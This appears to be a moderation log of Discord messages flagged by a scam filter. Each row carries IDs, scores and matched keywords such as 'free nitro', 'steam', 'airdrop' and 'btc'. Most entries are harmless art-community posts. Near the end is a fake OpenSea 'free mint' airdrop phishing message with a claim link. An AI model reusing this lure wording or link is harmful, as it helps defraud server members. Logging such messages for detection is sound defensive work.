1342912250146586814,2025-02-22 17:33:50.538000+00:00,1054121991365468281,1005229354432864266,1342912250146586814,2,0,['https://' -  'steam'],"https://www.fixdeviantart.com/mightyfilm/art/Don-t-Accept-a-Valentine-From-This-Guy-1153774129\nhttps://www.fixdeviantart.com/mightyfilm/art/Still-Can-t-Talk-to-Women-1154251207\nhttps://www.fixdeviantart.com/mightyfilm/art/Steamed-Hearts-1154543440\nhttps://www.fixdeviantart.com/mightyfilm/art/But-I-HATE-Baseball-Cards-1155145340\nhttps://www.fixdeviantart.com/mightyfilm/art/I-m-A-French-Fry-Eating-Lightning-Rod-1158535261"
1343275737536266270,2025-02-23 17:38:12.685000+00:00,1054121991365468281,749443249302929479,1343275737536266270,2,0,['@everyone' -  'free'],"Just a reminder for @everyone to check the source of an image before posting it in the NSFW channels. If you dont get it directly from an artist's socials, then do some google searching. Reverse image search is a wonderful tool that is free and easy to use. \n\nIf Generative AI continues to be posted outside of <#1057000304085831681>, your permissions to post images may be revoked."
1343552929701036073,2025-02-24 11:59:40.447000+00:00,1279487886479200326,490358699882315776,1343552929701036073,2,0,['https://' -  'gift'],"And here's how a finished pic looks, with Maria, as a late b-day gift i did for Valentim 🙂\nhttps://discord.com/channels/1279487886479200326/1291185029053022221/1343552722179461191"
1344235394320826488,2025-02-26 09:11:32.692000+00:00,1315138320262762547,749443249302929479,1344235394320826488,3,0,['nitro' -  'steam' -  'free'],"free nitro on steam"
1344807678828089405,2025-02-27 23:05:35.951000+00:00,1054121991365468281,1202161891905118243,1344807678828089405,2,0,['steam' -  'free'],"Im doing paw stickers for 10 dollars! (USD)\n\nOriginally a server exclusive of mine but thought maybe i could open it here as well for those who were interested eee!\n\nComes in a 4 toed and 3 toed alt\n\nAny paw type (beans, no beans, claws, etc)\n\nIncludes a FREE micro hand poke alt (can also be recolored after someone for free). Completely optional\n\nAlts can be done for +5 USD each (sweat, dirt, steam, etc)\n\nI accept Cashapp and Paypal, dm me if interested ^w^ 💚"
1345826260903006299,2025-03-02 18:33:04.842000+00:00,1054121991365468281,518524649760620554,1345826260903006299,2,0,['https://' -  'gift'],"https://www.vxfuraffinity.net/view/60073562/ got a little gift of my sune, wrote a little story too uwu"
1346163510404710560,2025-03-03 16:53:11.389000+00:00,612550152514961408,465057997190856714,1346163510404710560,2,0,['https://' -  'free'],"https://www.youtube.com/watch?v=0sjCUJ6nqjY feel free to join jackbox if you guys interested <a:Riko_boom:1343947071199252480>"
1347653085589147678,2025-03-07 19:32:13.788000+00:00,1279487886479200326,1264616737383645394,1347653085589147678,2,0,['https://' -  'steam'],"https://fixupx.com/Baggy_NSFW/status/1898094243022872663\n\nNewer (and better) SFX! Also steamy alt!! nwn"
1348839112643182663,2025-03-11 02:05:04.673000+00:00,1279487886479200326,1103910594152759319,1348839112643182663,2,0,['https://' -  'steam'],"https://zztwitter.com/SpiritSteamy/status/1899277190765609243"
1350869712933879808,2025-03-16 16:33:57.509000+00:00,1279487886479200326,490358699882315776,1350869712933879808,2,0,['https://' -  'steam'],"https://images.steamusercontent.com/ugc/2076779346569323164/5FA36C50D8D34F13D85EEE565A545D73E42E6BED/?imw=512&&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false"
1350985200565354567,2025-03-17 00:12:51.906000+00:00,1279487886479200326,156944678581698560,1350985200565354567,2,0,['https://' -  'gift'],"<https://www.furaffinity.net/view/60238513> Someone made a cute giftart of Sar and I just wanted to share. ❤️"
1352105934591234109,2025-03-20 02:26:15.720000+00:00,1279487886479200326,1264616737383645394,1352105934591234109,2,0,['https://' -  'steam'],"https://fixupx.com/BaggytheAlt/status/1902522791372468278\n\nSteamy, dirty and smelly alts uvu"
1352454638007226398,2025-03-21 01:31:53.093000+00:00,1279487886479200326,632508960670482434,1352454638007226398,2,0,['gift' -  'free'],"Remember, a gift art is a gift art; when I ever wanted to give some artist or non-artist that I like their stuff. That doesn't mean I would give you something for free even if you request it."
1352489820517175307,2025-03-21 03:51:41.257000+00:00,1279487886479200326,661261306732478474,1352489820517175307,2,0,['gift' -  'free'],"Maybe I'm being generous in this scenario, but I'm seeing he wants to pay, but he keeps bring up 'gift' \n\nLike is he trying to haggle a free comm, or buy a comm from you, to gift to one of his/her friends?"
1353801046039724133,2025-03-24 18:42:01.783000+00:00,1054121991365468281,749443249302929479,1353801046039724133,2,0,['https://' -  'free'],"Not me but a friend has some artistic freedom comms open\nhttps://fxbsky.app/profile/jayjaycholo.bsky.social/post/3ll5dsszcg224"
1354330598738628713,2025-03-26 05:46:16.985000+00:00,1054121991365468281,458542061319094293,1354330598738628713,2,0,['nitro' -  'free'],"And give me free nitro"
1354332691587399691,2025-03-26 05:54:35.959000+00:00,1054121991365468281,749443249302929479,1354332691587399691,2,0,['@everyone' -  'https://'],"@everyone (Sorry for the ping but this is big news)\n\nSome of you may have noticed some new channels and roles. All of these are to support our latest artist joining the beans sanctuary <@302586889439805452>! Many of you probably already know their work and follow them on [Twitter](<https://x.com/BoysNBreakdowns>) and/or [Bluesky](<https://bsky.app/profile/boysnbreakdowns.bsky.social>), but if you dont, please check out their gallery when you get the chance!\n\nWe've also set up ping roles for them in <#1054672645527969802> if you want the <@&1354269644260642946> or <@&1354257230886862878> roles!"
1354548569197117560,2025-03-26 20:12:25.192000+00:00,1054121991365468281,726725067375116318,1354548569197117560,2,0,['https://' -  'gift'],"Little gift for <@1317171465925165139>\nhttps://bsky.app/profile/charlie-da-wolf.bsky.social/post/3llclr7yrpc24"
1354983971469136184,2025-03-28 01:02:33.183000+00:00,1279487886479200326,1075967885836554352,1354983971469136184,0,1,['Zero Width Space'],"Today I took Cotufa ​​for a walk\nAnd a kind girl got close to her and petted her, saying that Cotufa is adorable\nI got the girl's phone number too, and she sended me pics of her dog"
1354984314953273404,2025-03-28 01:03:55.076000+00:00,1279487886479200326,1075967885836554352,1354984314953273404,0,1,['Zero Width Space'],"Welp\n\nToday I took my puppy ​​for a walk\nAnd a kind girl got close to her and petted her, saying that Cotufa is adorable\n\nI got the girl's phone number too, and she sended me pics of her dog"
1355000195087335486,2025-03-28 02:07:01.195000+00:00,1279487886479200326,1075967885836554352,1355000195087335486,0,1,['Zero Width Space'],"Ok\n\nToday I took Cotufa, my puppy ​​for a walk\n\nAnd a kind girl got close to her and petted her, saying that Cotufa is adorable"
1359251171793178636,2025-04-08 19:38:53.021000+00:00,612550152514961408,196385251981918208,1359251171793178636,2,0,['https://' -  'free'],"<:6280pinkarrowright:1000996894123773982>  Hi! I have commissions open! <a:776842595850518558:1005645861637857341> \nIf you are interested, you are free to send me a DM to my social links!\nYou can also check comms examples in my gallery too~\nhttps://ko-fi.com/album/ICON-COMMISSIONS-A0A4P1ZWO"
1359676672265162782,2025-04-09 23:49:40.239000+00:00,1279487886479200326,230089811589857280,1359676672265162782,2,0,['https://' -  'steam'],"https://steamcommunity.com/sharedfiles/filedetails/?id=3460966461&searchtext="
1361639804147728405,2025-04-15 09:50:27.353000+00:00,1279487886479200326,209044120159780865,1361639804147728405,2,0,['https://' -  'steam' -  'free'],"Free Steam game right now, get it now and you'll have it forever: https://store.steampowered.com/app/286690/Metro_2033_Redux/"
1362459405131710524,2025-04-17 16:07:15.455000+00:00,1054121991365468281,1256042507687428106,1362459405131710524,2,0,['https://' -  'gift'],"https://www.xfuraffinity.net/view/60606075/ Gift art I got this morning"
1363249200921317456,2025-04-19 20:25:37.445000+00:00,1315138320262762547,749443249302929479,1363249200921317456,2,0,['https://' -  'free'],"Stealing this from richi\n\n>  Got a preferred pronoun? Set em here it's free. https://pr.alejo.io/   It helps the streamer remember."
1366174214150815774,2025-04-27 22:08:34.943000+00:00,1054121991365468281,749443249302929479,1366174214150815774,4,0,['free' -  ' btc' -  ' eth' -  'eth '],"free eth btc"
1366176360980287559,2025-04-27 22:17:06.787000+00:00,1054121991365468281,749443249302929479,1366176360980287559,2,0,['free' -  'airdrop'],"We’ve partnered with OpenSea for a new free  Mint! Users in this server are invited to join.\n\n🚀 @ everyone @ here You have a chance to be selected, so make sure to participate and MINT as soon as possible.\nSome claims may require gas!\nThis is an automatically generated announcement message\nCLICK HERE TO CLAIM!\n🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\n\nTRY YOUR LUCK ! 🚀"
1366176663330881657,2025-04-27 22:18:18.873000+00:00,1054121991365468281,749443249302929479,1366176663330881657,4,0,['https://' -  'gift' -  'free' -  'airdrop'],"We’ve partnered with OpenSea for a new free  Mint! Users in this server are invited to join.\n\n🚀 @ everyone @ here You have a chance to be selected, so make sure to participate and MINT as soon as possible.\nSome claims may require gas!\nThis is an automatically generated announcement message\nCLICK HERE TO CLAIM!\n🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\n\nTRY YOUR LUCK ! 🚀\n https:// openseasprogift8.vercel.app/"
